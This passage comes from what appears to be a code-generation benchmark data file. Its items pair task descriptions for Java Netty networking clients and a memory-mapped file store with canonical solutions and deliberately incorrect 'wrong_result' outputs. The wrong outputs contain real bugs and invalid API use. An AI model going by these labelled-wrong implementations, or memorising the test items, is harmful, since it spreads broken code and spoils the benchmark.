    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.bytes.ByteArrayEncoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport java.net.InetSocketAddress;\nimport java.nio.charset.Charset;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic static Map<String, Channel> channelMap;\npublic static Map<String, NioEventLoopGroup> groupMap;\n\n@Override\npublic Channel initSocketClientAndSendMessage(String host, String message) throws Exception {\n    if(channelMap==null){\n        channelMap = new HashMap<>();\n    }\n    if(groupMap==null){\n        groupMap = new HashMap<>();\n    }\n\n    if(channelMap.get(host)==null){\n        NioEventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(new InetSocketAddress(host, 9003))\n                .handler(new ChannelInitializer() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        ch.pipeline().addLast(new StringEncoder(Charset.forName(\"GBK\")));\n                        ch.pipeline().addLast(new ByteArrayEncoder());\n                        ch.pipeline().addLast(new ChunkedWriteHandler());\n                    }\n                });\n            ChannelFuture cf = b.connect();\n            channelMap.put(host, cf.channel());\n            groupMap.put(host, group);\n            return null;\n        } catch (Exception e){\n            group.shutdownGracefully().sync();\n            return null;\n        }\n    }else{\n        channelMap.get(host).writeAndFlush(StringTools.hexStringToBytes(message));\n        return channelMap.get(host);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyTcpClient {\n    private final Map<String, Channel> channelMap = new HashMap<>();\n    private final Map<String, NioEventLoopGroup> groupMap = new HashMap<>();\n\n    public Channel initSocketClientAndSendMessage(String host, String message) {\n        Channel channel = channelMap.get(host);\n        if (channel != null && channel.isActive()) {\n            send(message, channel);\n            return channel;\n        }\n\n        String[] parts = host.split(\":\");\n        String ip = parts[0];\n        int port = parts.length > 1 ? Integer.parseInt(parts[1]) : 8080;\n\n        NioEventLoopGroup group = groupMap.get(host);\n        if (group == null) {\n            group = new NioEventLoopGroup();\n            groupMap.put(host, group);\n        }\n\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                 .channel(NioSocketChannel.class)\n                 .handler(new ChannelInitializer<SocketChannel>() {\n                     @Override\n                     public void initChannel(SocketChannel ch) throws Exception {\n                         ch.pipeline().addLast(new StringEncoder());\n                         ch.pipeline().addLast(new StringDecoder());\n                         ch.pipeline().addLast(new SimpleChannelInboundHandler<String>() {\n                             @Override\n                             protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n                             }\n                         });\n                     }\n                 });\n\n        ChannelFuture future = bootstrap.connect(ip, port).syncUninterruptibly();\n        Channel newChannel = future.channel();\n        channelMap.put(host, newChannel);\n        send(message, newChannel);\n        return newChannel;\n    }\n\n    private void send(String message, Channel channel) {\n        ByteBuf buf = Unpooled.copiedBuffer(message, CharsetUtil.UTF_8);\n        channel.writeAndFlush(buf);\n    }\n}"
  },
  {
    "Task_id": 138,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework for network communication, capable of establishing connections, sending/receiving messages, and gracefully shutting down.\n\nClass Description: NettyRemotingClient is a Netty-based TCP client implementation that handles network communication with a remote server. It manages connection lifecycle, message encoding/decoding, and provides synchronous invocation capabilities.\n\nAttributes:\n- bootstrap: [Bootstrap] - Netty's Bootstrap instance for client configuration\n- eventLoopGroupWorker: [EventLoopGroup] - Manages client-side I/O threads\n\nMethods:\n- NettyRemotingClient(): [Constructor] -> [void] - Initializes the client with NioEventLoopGroup and configures Bootstrap with NioSocketChannel, TCP_NODELAY option, and pipeline handlers (encoder, decoder, and client handler)\n- createChannel(String addr): [String addr (host:port format)] -> [ChannelFuture] - Creates a channel connection to the specified address, throws RemotingConnectException if connection fails\n- invokeSync(Channel channel, RemotingCommand request, long timeoutMillis): [Channel channel, RemotingCommand request, long timeoutMillis] -> [CompletableFuture<RemotingCommand>] - Sends a request synchronously through the channel and returns a CompletableFuture for the response\n- shutdown(): [void] -> [void] - Gracefully shuts down the event loop group and releases resources\n- NettyClientHandler: [Inner Class] -> [void] - Handles incoming messages from the server (extends SimpleChannelInboundHandler<RemotingCommand>)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport org.apache.rocketmq.remoting.exception.RemotingConnectException;\nimport org.apache.rocketmq.remoting.protocol.RemotingCommand;\n\nimport java.util.concurrent.CompletableFuture;\n\npublic class NettyRemotingClient {\n\n    private final Bootstrap bootstrap = new Bootstrap();\n    private final EventLoopGroup eventLoopGroupWorker;\n\n    public NettyRemotingClient() {\n        this.eventLoopGroupWorker = new NioEventLoopGroup();\n        this.bootstrap.group(this.eventLoopGroupWorker)\n            .channel(NioSocketChannel.class)\n            .option(ChannelOption.TCP_NODELAY, true)\n            .option(ChannelOption.SO_KEEPALIVE, false)\n            .handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addLast(\n                        new NettyEncoder(),\n                        new NettyDecoder(),\n                        new NettyClientHandler());\n                }\n            });\n    }\n\n    public ChannelFuture createChannel(String addr) throws InterruptedException, RemotingConnectException {\n        String[] hostAndPort = addr.split(\":\");\n        ChannelFuture channelFuture = bootstrap.connect(hostAndPort[0], Integer.parseInt(hostAndPort[1])).sync();\n        if (!channelFuture.isSuccess()) {\n            throw new RemotingConnectException(addr);\n        }\n        return channelFuture;\n    }\n\n    public CompletableFuture<RemotingCommand> invokeSync(Channel channel, RemotingCommand request, long timeoutMillis) {\n        CompletableFuture<RemotingCommand> future = new CompletableFuture<>();\n        try {\n            channel.writeAndFlush(request).addListener(f -> {\n                if (f.isSuccess()) {\n                    // Handle response logic here\n                } else {\n                    future.completeExceptionally(f.cause());\n                }\n            });\n        } catch (Exception e) {\n            future.completeExceptionally(e);\n        }\n        return future;\n    }\n\n    public void shutdown() {\n        this.eventLoopGroupWorker.shutdownGracefully();\n    }\n\n    class NettyClientHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n            // Process incoming messages\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyRemotingClient {\n    private final Bootstrap bootstrap;\n    private final EventLoopGroup eventLoopGroupWorker;\n    private final ConcurrentMap<String, CompletableFuture<RemotingCommand>> pendingFutures = new ConcurrentHashMap<>();\n\n    public NettyRemotingClient() {\n        eventLoopGroupWorker = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n        bootstrap.group(eventLoopGroupWorker)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new ObjectEncoder());\n                        ch.pipeline().addLast(new ObjectDecoder(RemotingCommand.class));\n                        ch.pipeline().addLast(new NettyClientHandler());\n                    }\n                });\n    }\n\n    public ChannelFuture createChannel(String addr) throws RemotingConnectException {\n        String[] parts = addr.split(\":\");\n        String host = parts[0];\n        int port = Integer.parseInt(parts[1]);\n        ChannelFuture future = bootstrap.connect(host, port);\n        future.syncUninterruptibly();\n        if (!future.isSuccess()) {\n            throw new RemotingConnectException(\"Failed to connect to \" + addr, future.cause());\n        }\n        return future;\n    }\n\n    public CompletableFuture<RemotingCommand> invokeSync(Channel channel, RemotingCommand request, long timeoutMillis) {\n        String requestId = UUID.randomUUID().toString();\n        CompletableFuture<RemotingCommand> future = new CompletableFuture<>();\n        pendingFutures.put(requestId, future);\n        channel.writeAndFlush(request);\n        try {\n            future.get(timeoutMillis, TimeUnit.MILLISECONDS);\n        } catch (Exception e) {\n            future.completeExceptionally(e);\n        }\n        pendingFutures.remove(requestId);\n        return future;\n    }\n\n    public void shutdown() {\n        eventLoopGroupWorker.shutdownGracefully();\n    }\n\n    private class NettyClientHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n            String requestId = msg.getRequestId();\n            CompletableFuture<RemotingCommand> future = pendingFutures.get(requestId);\n            if (future != null) {\n                future.complete(msg);\n                pendingFutures.remove(requestId);\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            CompletableFuture<RemotingCommand> future = pendingFutures.get(\"exception\");\n            if (future != null) {\n                future.completeExceptionally(cause);\n                pendingFutures.remove(\"exception\");\n            }\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 14,
    "Instruction": "Task Description: Implement a class that provides memory-mapped file operations for efficient random read access while supporting sequential write operations. The class should manage file segments, handle resource cleanup, and provide disk usage information.\n\nClass Description: AppendStoreMmap is an abstract class that implements memory-mapped file operations for large files divided into segments. It combines sequential writing with random reading capabilities using memory mapping for efficient access. The class handles file channel management, segment mapping, and resource cleanup.\n\nAttributes:\n- outputStream: DataOutputStream - Used for sequential writing operations\n- segmentBits: int - Number of bits representing segment size (log2 of segment size)\n- segmentMask: long - Bitmask for segment calculations\n- segmentBytes: long - Size of each segment in bytes\n- path: Path - File path being operated on\n- madvise: boolean - Whether to use memory advice for mapped buffers\n- outIdx: long - Current output index position\n- segments: MappedByteBuffer[] - Array of mapped byte buffers for file segments\n- channel: FileChannel - File channel for memory mapping operations\n- LOGGER: Logger - Logger instance for error reporting\n\nMethods:\n- AppendStoreMmap(Path path, boolean madvise) -> None - Constructor with default segment size (1GB)\n- AppendStoreMmap(Path path, long segmentSizeBytes, boolean madvise) -> None - Constructor with custom segment size\n- getSegments() -> MappedByteBuffer[] - Returns mapped segments, initializing them if needed\n- close() -> None - Closes all resources and unmaps segments\n- diskUsageBytes() -> long - Returns current disk usage of the file",
    "Canonical_solution": "import java.io.BufferedOutputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Arrays;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nabstract class AppendStoreMmap implements AppendStore {\n\n  private static final Logger LOGGER = LoggerFactory.getLogger(AppendStoreMmap.class);\n\n  final DataOutputStream outputStream;\n  final int segmentBits;\n  final long segmentMask;\n  final long segmentBytes;\n  private final Path path;\n  private final boolean madvise;\n  long outIdx = 0;\n  private volatile MappedByteBuffer[] segments;\n  private volatile FileChannel channel;\n\n  AppendStoreMmap(Path path, boolean madvise) {\n    this(path, 1 << 30, madvise);\n  }\n\n  AppendStoreMmap(Path path, long segmentSizeBytes, boolean madvise) {\n    this.path = path;\n    this.madvise = madvise;\n    segmentBits = (int) (Math.log(segmentSizeBytes) / Math.log(2));\n    segmentMask = (1L << segmentBits) - 1;\n    segmentBytes = segmentSizeBytes;\n    try {\n      this.outputStream = new DataOutputStream(new BufferedOutputStream(Files.newOutputStream(path), 50_000));\n    } catch (IOException e) {\n      throw new IllegalStateException(\"Could not create SequentialWriteRandomReadFile output stream\", e);\n    }\n  }\n\n  MappedByteBuffer[] getSegments() {\n    if (segments == null) {\n      synchronized (this) {\n        if (segments == null) {\n          try {\n            outputStream.close();\n            channel = FileChannel.open(path, StandardOpenOption.READ);\n            segments = ByteBufferUtil.mapFile(channel, outIdx, segmentBytes, madvise);\n          } catch (IOException e) {\n            throw new UncheckedIOException(e);\n          }\n        }\n      }\n    }\n    return segments;\n  }\n\n  @Override\n  public void close() throws IOException {\n    outputStream.close();\n    synchronized (this) {\n      if (channel != null) {\n        channel.close();\n      }\n      if (segments != null) {\n        try {\n          ByteBufferUtil.free(segments);\n        } catch (IOException e) {\n          LOGGER.info(\"Unable to unmap {} {}\", path, e);\n        }\n        Arrays.fill(segments, null);\n      }\n    }\n  }\n\n  @Override\n  public long diskUsageBytes() {\n    return FileUtils.size(path);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class AppendStoreMmap {\n    protected final Path path;\n    protected final boolean madvise;\n    protected long segmentSizeBytes;\n    protected int segmentBits;\n    protected long segmentMask;\n    protected final FileChannel channel;\n    protected final DataOutputStream outputStream;\n    protected long outIdx;\n    protected MappedByteBuffer[] segments;\n    protected final Logger LOGGER;\n\n    public AppendStoreMmap(Path path, boolean madvise) throws IOException {\n        this(path, 1L << 30, madvise);\n    }\n\n    public AppendStoreMmap(Path path, long segmentSizeBytes, boolean madvise) throws IOException {\n        this.path = path;\n        this.madvise = madvise;\n        this.segmentSizeBytes = segmentSizeBytes;\n        this.segmentBits = (int) (Long.bitLength(segmentSizeBytes) - 1);\n        this.segmentMask = (1L << segmentBits) - 1;\n        this.channel = FileChannel.open(path, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE);\n        this.outputStream = new DataOutputStream(channel);\n        this.outIdx = 0;\n        this.segments = new MappedByteBuffer[0];\n        this.LOGGER = LoggerFactory.getLogger(AppendStoreMmap.class);\n    }\n\n    public MappedByteBuffer[] getSegments() {\n        if (segments == null || segments.length == 0) {\n            segments = new MappedByteBuffer[1];\n            segments[0] = mapSegment(0);\n        }\n        long segmentIndex = outIdx / segmentSizeBytes;\n        while (segments.length <= segmentIndex) {\n            segments = Arrays.copyOf(segments, segments.length + 1);\n            segments[segments.length - 1] = mapSegment(segments.length - 1);\n        }\n        return segments;\n    }\n\n    private MappedByteBuffer mapSegment(int segmentIndex) {\n        long fileSize = channel.size();\n        long requiredSize = (segmentIndex + 1) * segmentSizeBytes;\n        if (fileSize < requiredSize) {\n            try {\n                channel.truncate(requiredSize);\n            } catch (IOException e) {\n                LOGGER.error(\"Failed to extend file size\", e);\n                throw new RuntimeException(\"Failed to extend file size\", e);\n            }\n        }\n        MappedByteBuffer buffer = channel.map(FileChannel.MapMode.READ_WRITE, segmentIndex * segmentSizeBytes, segmentSizeBytes);\n        if (madvise) {\n            try {\n                NativeMemory.madvise(buffer.address(), segmentSizeBytes, MADV_DONTNEED);\n            } catch (UnsatisfiedLinkError e) {\n                LOGGER.warn(\"madvise not supported on this platform\");\n            }\n        }\n        return buffer;\n    }\n\n    public void close() throws IOException {\n        if (outputStream != null) {\n            outputStream.close();\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        for (MappedByteBuffer buf : segments) {\n            buf.force();\n        }\n    }\n\n    public long diskUsageBytes() {\n        try {\n            return channel.size();\n        } catch (IOException e) {\n            LOGGER.error(\"Failed to get file size\", e);\n            return -1;\n        }\n    }\n}"
  },
  {
    "Task_id": 140,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based HTTP client for RPC communication, capable of establishing and managing TCP connections, sending requests, and handling responses.\n\nClass Description: NettyHttpConnectClient is a connection client implementation that uses Netty framework to establish HTTP connections with a remote server. It handles connection lifecycle, request sending, and connection validation.\n\nAttributes:\n- group: [EventLoopGroup] - Manages client-side I/O threads\n- channel: [Channel] - Represents the active network channel\n- serializer: [Serializer] - Handles request/response serialization\n- address: [String] - The server address including protocol and port\n- host: [String] - The server hostname extracted from address\n\nMethods:\n- init: [init(String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory)] -> [void] - Initializes the client with server address, serializer and invoker factory. Creates Netty bootstrap and establishes connection.\n- isValidate: [isValidate()] -> [boolean] - Checks if the current connection is active and valid.\n- close: [close()] -> [void] - Closes the active connection and releases resources.\n- send: [send(XxlRpcRequest xxlRpcRequest)] -> [void] - Serializes and sends an RPC request to the server through the established channel.",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.invoker.XxlRpcInvokerFactory;\nimport com.wugui.datax.rpc.remoting.net.common.ConnectClient;\nimport com.wugui.datax.rpc.remoting.net.common.NettyConstant;\nimport com.wugui.datax.rpc.remoting.net.params.Beat;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcRequest;\nimport com.wugui.datax.rpc.serialize.Serializer;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.net.URI;\nimport java.net.URL;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttpConnectClient extends ConnectClient {\n\n    private EventLoopGroup group;\n    private Channel channel;\n    private Serializer serializer;\n    private String address;\n    private String host;\n\n    @Override\n    public void init(String address, final Serializer serializer, final XxlRpcInvokerFactory xxlRpcInvokerFactory) throws Exception {\n        final NettyHttpConnectClient thisClient = this;\n\n        if (!address.toLowerCase().startsWith(\"http\")) {\n            address = \"http://\" + address;\n        }\n\n        this.address = address;\n        URL url = new URL(address);\n        this.host = url.getHost();\n        int port = url.getPort() > -1 ? url.getPort() : 80;\n\n        this.group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel channel) throws Exception {\n                        channel.pipeline()\n                                .addLast(new IdleStateHandler(0, 0, Beat.BEAT_INTERVAL, TimeUnit.SECONDS))\n                                .addLast(new HttpClientCodec())\n                                .addLast(new HttpObjectAggregator(NettyConstant.MAX_LENGTH))\n                                .addLast(new NettyHttpClientHandler(xxlRpcInvokerFactory, serializer, thisClient));\n                    }\n                })\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000);\n        this.channel = bootstrap.connect(host, port).sync().channel();\n\n        this.serializer = serializer;\n\n        if (!isValidate()) {\n            close();\n            return;\n        }\n    }\n\n    @Override\n    public boolean isValidate() {\n        if (this.channel != null) {\n            return this.channel.isActive();\n        }\n        return false;\n    }\n\n    @Override\n    public void close() {\n        if (this.channel != null && this.channel.isActive()) {\n            this.channel.close();\n        }\n        if (this.group != null && !this.group.isShutdown()) {\n            this.group.shutdownGracefully();\n        }\n    }\n\n    @Override\n    public void send(XxlRpcRequest xxlRpcRequest) throws Exception {\n        byte[] requestBytes = serializer.serialize(xxlRpcRequest);\n\n        DefaultFullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, new URI(address).getRawPath(), Unpooled.wrappedBuffer(requestBytes));\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);\n        request.headers().set(HttpHeaderNames.CONTENT_LENGTH, request.content().readableBytes());\n\n        this.channel.writeAndFlush(request).sync();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyHttpConnectClient {\n    private EventLoopGroup group;\n    private Channel channel;\n    private Serializer serializer;\n    private String address;\n    private String host;\n    private XxlRpcInvokerFactory xxlRpcInvokerFactory;\n\n    public void init(String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory) {\n        this.address = address;\n        this.serializer = serializer;\n        this.xxlRpcInvokerFactory = xxlRpcInvokerFactory;\n        \n        int port = 80;\n        String[] parts = address.split(\"://\");\n        if (parts.length == 2) {\n            String hostPort = parts[1];\n            int colonIdx = hostPort.indexOf(':');\n            if (colonIdx != -1) {\n                port = Integer.parseInt(hostPort.substring(colonIdx + 1));\n                host = hostPort.substring(0, colonIdx);\n            } else {\n                host = hostPort;\n            }\n        } else {\n            host = address;\n        }\n\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .handler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             public void initChannel(SocketChannel ch) throws Exception {\n                 ch.pipeline().addLast(new HttpClientCodec());\n                 ch.pipeline().addLast(new HttpObjectAggregator(1048576));\n                 ch.pipeline().addLast(new SimpleChannelInboundHandler<HttpObject>() {\n                     @Override\n                     protected void channelRead0(ChannelHandlerContext ctx, HttpObject msg) throws Exception {\n                         if (msg instanceof HttpResponse) {\n                             HttpResponse response = (HttpResponse) msg;\n                             if (response.status().code() == 200) {\n                                 ByteBuf content = ((HttpContent) msg).content();\n                                 if (content.isReadable()) {\n                                     XxlRpcResponse responseObj = (XxlRpcResponse) serializer.deserialize(content);\n                                     xxlRpcInvokerFactory.processResponse(responseObj);\n                                 }\n                             }\n                         }\n                     }\n                 });\n             }\n         });\n\n        ChannelFuture future = b.connect(host, port).syncUninterruptibly();\n        channel = future.channel();\n    }\n\n    public boolean isValidate() {\n        return channel != null && channel.isActive();\n    }\n\n    public void close() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void send(XxlRpcRequest xxlRpcRequest) {\n        if (!isValidate()) {\n            throw new IllegalStateException(\"Channel is not valid\");\n        }\n\n        ByteBuf content = serializer.serialize(xxlRpcRequest);\n        DefaultFullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, \"/rpc\", content);\n        request.headers().set(HttpHeaderNames.CONTENT_TYPE, \"application/octet-stream\");\n        request.headers().set(HttpHeaderNames.CONTENT_LENGTH, content.readableBytes());\n\n        channel.writeAndFlush(request);\n        content.release();\n    }\n}"
  },
  {
    "Task_id": 141,
    "Instruction": "Task Description: Create a Java class that manages TCP client connections using Netty framework, handling connection establishment, maintenance, and graceful shutdown.\n\nClass Description: HttpEventChannelManager is a Netty-based TCP client manager that creates and maintains connections to remote servers, provides connection metrics, and handles resource cleanup.\n\nAttributes:\n- LOG: [Logger] - Logger instance for logging debug and error messages\n- connectionSuccess: [Counter] - Metric counter for successful connections\n- connectionFailure: [Counter] - Metric counter for failed connections\n- liveConnections: [AtomicDouble] - Gauge metric for current active connections\n- nettyChannelBufferSize: [AtomicDouble] - Gauge metric for current channel buffer size\n- lowWriteBufferWatermark: [int] - Low watermark for write buffer\n- highWriteBufferWatermark: [int] - High watermark for write buffer\n- eventLoopGroup: [EventLoopGroup] - Netty event loop group for I/O operations\n- encoderEventLoopGroup: [EventLoopGroup] - Optional event loop group for compression\n- bootstrap: [Bootstrap] - Netty bootstrap for client configuration\n- channels: [ConcurrentMap<String, Channel>] - Map of active channels keyed by host:port\n\nMethods:\n- HttpEventChannelManager([Registry, MrePublishConfiguration]) -> [void] - Constructor that initializes metrics, event loops, and bootstrap configuration\n- findOrCreate([InetSocketAddress]) -> [Channel] - Finds existing or creates new channel for given address\n- find([InetSocketAddress]) -> [Channel] - Finds existing channel for given address\n- close([InetSocketAddress]) -> [void] - Closes channel for given address\n- getHostPortString([InetSocketAddress]) -> [String] - Helper method to format address as host:port string",
    "Canonical_solution": "import com.netflix.spectator.api.Counter;\nimport com.netflix.spectator.api.Registry;\nimport com.netflix.spectator.impl.AtomicDouble;\nimport io.mantisrx.publish.config.MrePublishConfiguration;\nimport io.mantisrx.publish.internal.metrics.SpectatorUtils;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.DefaultEventLoopGroup;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.WriteBufferWaterMark;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class HttpEventChannelManager {\n\n    private static final Logger LOG = LoggerFactory.getLogger(HttpEventChannel.class);\n\n    private final Counter connectionSuccess;\n    private final Counter connectionFailure;\n    private final AtomicDouble liveConnections;\n    private final AtomicDouble nettyChannelBufferSize;\n\n    private final int lowWriteBufferWatermark;\n    private final int highWriteBufferWatermark;\n\n    private final EventLoopGroup eventLoopGroup;\n    private final EventLoopGroup encoderEventLoopGroup;\n    private final Bootstrap bootstrap;\n    private final ConcurrentMap<String, Channel> channels;\n\n    public HttpEventChannelManager(\n            Registry registry,\n            MrePublishConfiguration config) {\n\n        this.connectionSuccess =\n                SpectatorUtils.buildAndRegisterCounter(\n                        registry, \"connectionSuccess\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.connectionFailure =\n                SpectatorUtils.buildAndRegisterCounter(\n                        registry, \"connectionFailure\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.liveConnections =\n                SpectatorUtils.buildAndRegisterGauge(\n                        registry, \"liveConnections\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.nettyChannelBufferSize =\n                SpectatorUtils.buildAndRegisterGauge(\n                        registry, \"bufferSize\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n\n        this.lowWriteBufferWatermark = config.getLowWriteBufferWatermark();\n        this.highWriteBufferWatermark = config.getHighWriteBufferWatermark();\n\n        this.eventLoopGroup = new NioEventLoopGroup(config.getIoThreads());\n\n        boolean gzipEnabled = config.getGzipEnabled();\n        if (gzipEnabled) {\n            this.encoderEventLoopGroup = new DefaultEventLoopGroup(config.getCompressionThreads());\n        } else {\n            this.encoderEventLoopGroup = null;\n        }\n\n        this.bootstrap = new Bootstrap()\n                .group(this.eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.MESSAGE_SIZE_ESTIMATOR, MantisMessageSizeEstimator.DEFAULT)\n                .option(ChannelOption.WRITE_BUFFER_WATER_MARK,\n                        new WriteBufferWaterMark(\n                                lowWriteBufferWatermark, highWriteBufferWatermark))\n                .handler(new HttpEventChannelInitializer(\n                        registry, config, encoderEventLoopGroup));\n        this.channels = new ConcurrentHashMap<>();\n\n        Runtime.getRuntime().addShutdownHook(new Thread(this.eventLoopGroup::shutdownGracefully));\n    }\n\n    Channel findOrCreate(InetSocketAddress address) {\n        Channel channel = find(address);\n\n        if (channel == null) {\n            LOG.debug(\"creating new channel for {}\", address);\n            ChannelFuture channelFuture = bootstrap.connect(address);\n            channel = channelFuture.channel();\n\n            channels.put(getHostPortString(address), channel);\n\n            channel.closeFuture().addListener(future -> {\n                LOG.debug(\"closing channel for {}\", address);\n                channels.remove(getHostPortString(address));\n                liveConnections.set((double) channels.size());\n            });\n\n            channelFuture.addListener(future -> {\n                if (future.isSuccess()) {\n                    LOG.debug(\"connection success for {}\", address);\n                    connectionSuccess.increment();\n                    liveConnections.set((double) channels.size());\n                } else {\n                    LOG.debug(\"failed to connect to {}\", address);\n                    connectionFailure.increment();\n                }\n            });\n        }\n\n        nettyChannelBufferSize.set(highWriteBufferWatermark - channel.bytesBeforeUnwritable());\n\n        return channel;\n    }\n\n    private Channel find(InetSocketAddress address) {\n        return channels.get(getHostPortString(address));\n    }\n\n    void close(InetSocketAddress address) {\n        Channel channel = find(address);\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    private String getHostPortString(InetSocketAddress address) {\n        return address.getHostString() + ':' + address.getPort();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class HttpEventChannelManager {\n    private final Logger LOG;\n    private final Counter connectionSuccess;\n    private final Counter connectionFailure;\n    private final AtomicDouble liveConnections;\n    private final AtomicDouble nettyChannelBufferSize;\n    private final int lowWriteBufferWatermark;\n    private final int highWriteBufferWatermark;\n    private final EventLoopGroup eventLoopGroup;\n    private final EventLoopGroup encoderEventLoopGroup;\n    private final Bootstrap bootstrap;\n    private final ConcurrentMap<String, Channel> channels;\n    private final Registry registry;\n    private final MrePublishConfiguration config;\n\n    public HttpEventChannelManager(Registry registry, MrePublishConfiguration config) {\n        this.registry = registry;\n        this.config = config;\n        this.LOG = LoggerFactory.getLogger(HttpEventChannelManager.class);\n        this.connectionSuccess = registry.counter(\"connection_success\");\n        this.connectionFailure = registry.counter(\"connection_failure\");\n        this.liveConnections = registry.gauge(\"live_connections\", new DoubleMetric());\n        this.nettyChannelBufferSize = registry.gauge(\"netty_channel_buffer_size\", new DoubleMetric());\n        this.lowWriteBufferWatermark = config.getLowWriteBufferWatermark();\n        this.highWriteBufferWatermark = config.getHighWriteBufferWatermark();\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.encoderEventLoopGroup = config.getEncoderEventLoopGroup() != null ? new NioEventLoopGroup() : null;\n        this.bootstrap = new Bootstrap();\n        bootstrap.group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.WRITE_BUFFER_LOW_WATERMARK, lowWriteBufferWatermark)\n                .option(ChannelOption.WRITE_BUFFER_HIGH_WATERMARK, highWriteBufferWatermark)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel 